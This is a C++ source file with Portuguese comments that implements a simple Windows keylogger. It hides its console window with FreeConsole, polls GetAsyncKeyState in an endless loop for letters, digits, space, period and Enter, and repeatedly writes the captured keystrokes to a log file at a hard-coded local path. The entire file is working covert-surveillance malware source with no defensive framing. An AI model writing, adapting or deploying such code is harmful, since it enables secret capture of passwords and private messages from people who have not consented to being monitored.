#include <windows.h>
#include <iostream>         //bibliotecas... =]
#include <fstream>          // essa biblioteca realiza(fluxo) tanto operações de entrada como de saída...
#include <string>

using namespace std;

int main(){
    FreeConsole();   //deixa a janela invisivel, haha...
     
    string teclas;    //variaveis
 
    while(1==1){  //NÃO usei o TRUE, haha, legibilidade do codigo...(creditos pela diga, 0KaL! KKKK)
      if(GetAsyncKeyState(0x41)){       //aqui fica responsavel pela captura das teclas...
           cout << "a";     //41 é o equivale a letra "a" em HEXADECIMAL... então ele imprime a letra "a" na string  "teclas".               
           teclas+= "a";    //vai fazer isso pelo o resto do código!
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x42)){
           cout << "b";
           teclas+= "b";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x43)){
           cout << "c";
           teclas+= "c";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x44)){
           cout<<"d";
           teclas+="d";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x45)){
           cout<<"e";
           teclas+="e";
           Sleep(200);                      
      };      
     
      if(GetAsyncKeyState(0x46)){
           cout<<"f";
           teclas+="f";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x47)){
           cout<<"g";
           teclas+="g";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x48)){
           cout<<"h";
           teclas+="h";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x49)){
           cout<<"i";
           teclas+="i";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4a)){
           cout<<"j";
           teclas+="j";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4b)){
           cout<<"k";
           teclas+="k";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4c)){
           cout<<"l";
           teclas+="l";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4d)){
           cout<<"m";
           teclas+="m";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4e)){
           cout<<"n";
           teclas+="n";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x4f)){
           cout<<"o";
           teclas+="o";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x50)){
           cout<<"p";
           teclas+="p";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x51)){
           cout<<"q";
           teclas+="q";
           Sleep(200);                      
      };  
      if(GetAsyncKeyState(0x52)){
           cout<<"r";
           teclas+="r";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x53)){
           cout<<"s";
           teclas+="s";
           Sleep(200);                      
      };  
      if(GetAsyncKeyState(0x54)){
           cout<<"t";
           teclas+="t";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x55)){
           cout<<"u";
           teclas+="u";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x56)){
           cout<<"v";
           teclas+="v";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x57)){
           cout<<"w";
           teclas+="w";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x58)){
           cout<<"x";
           teclas+="x";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x59)){
           cout<<"y";
           teclas+="y";
           Sleep(200);                      
      };      
      if(GetAsyncKeyState(0x5A)){
           cout<<"z";
           teclas+="z";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(VK_SPACE)){
           cout<<" ";
           teclas+=" ";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x6E)){
           cout<<".";
           teclas+=".";
           Sleep(200);                      
      }; 
      if(GetAsyncKeyState(0x0d)){
           cout<<"/n";
           teclas+="<br>";
           Sleep(200);
      };
      if(GetAsyncKeyState(0x30)){
           cout<<"0";
           teclas+="0";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x31)){
           cout<<"1";
           teclas+="1";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x32)){
           cout<<"2";
           teclas+="2";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x33)){
           cout<<"3";
           teclas+="3";
           Sleep(200);                      
      };       
      if(GetAsyncKeyState(0x34)){
           cout<<"4";
           teclas+="4";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x35)){
           cout<<"5";
           teclas+="5";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x36)){
           cout<<"6";
           teclas+="6";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x37)){
           cout<<"7";
           teclas+="7";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x38)){
           cout<<"8";
           teclas+="8";
           Sleep(200);                      
      };
      if(GetAsyncKeyState(0x39)){
           cout<<"9";
           teclas+="9";
           Sleep(200);                      
      };
      
          // cria um  arquvo txt para implementar as teclas digitadas...
  ofstream meu_arquivozinho;      
  meu_arquivozinho.open ("C:\\Work\\LINGUAGEM C\\Keylogger\\log_das_teclas.xls");       
  meu_arquivozinho << teclas;                        // faz digita a string teclas no arquivo txt.
  meu_arquivozinho.close();                         // fecha.

};
}
